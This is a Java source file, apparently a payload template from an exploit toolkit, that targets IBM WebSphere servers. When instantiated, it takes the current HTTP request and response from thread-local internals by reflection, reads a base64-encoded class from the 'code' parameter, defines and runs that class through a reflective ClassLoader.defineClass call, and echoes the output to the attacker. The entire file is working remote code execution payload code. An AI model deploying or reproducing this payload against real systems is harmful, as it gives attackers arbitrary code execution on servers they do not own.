package jeg.core.template.websphere;

import java.lang.reflect.Field;
import java.lang.reflect.Method;

/**
 * 执行代码回显(classBytes)
 */
public class WebSphereCodeExecTpl {

    public WebSphereCodeExecTpl() {
        run();
    }

    // 传参：类字节码
    private  String getReqParamName() {
        return "code";
    }


    private  void run() {
        try {
            Class clazz = Thread.currentThread().getClass();
            Field field = clazz.getDeclaredField("wsThreadLocals");
            field.setAccessible(true);
            Object obj = field.get(Thread.currentThread());
            Object[] obj_arr = (Object[]) obj;
            for (int i = 0; i < obj_arr.length; i++) {
                Object o = obj_arr[i];
                if (o == null) continue;
                if (o.getClass().getName().endsWith("WebContainerRequestState")) {
                    Object req = o.getClass().getMethod("getCurrentThreadsIExtendedRequest", new Class[0]).invoke(o, new Object[0]);
                    Object resp = o.getClass().getMethod("getCurrentThreadsIExtendedResponse", new Class[0]).invoke(o, new Object[0]);
                    String code = (String) req.getClass().getMethod("getParameter", new Class[]{String.class}).invoke(req, new Object[]{getReqParamName()});
                    if (code != null && !code.isEmpty()) {
                        String execRes = exec(code);
                        java.io.PrintWriter printWriter = (java.io.PrintWriter) resp.getClass().getMethod("getWriter", new Class[0]).invoke(resp, new Object[0]);
                        printWriter.println(execRes);
                    }
                    break;
                }
            }
        } catch (Exception e) {
        }
    }

    private  String exec(String var2) {
        try {
            byte[] clazzByte = base64Decode(var2);
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class clazz = (Class) defineClass.invoke(Thread.currentThread().getContextClassLoader(), clazzByte, 0, clazzByte.length);
            return clazz.newInstance().toString();
        } catch (Exception e) {
            return e.getMessage();
        }
    }

    private  byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception var4) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke((Object) null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
}
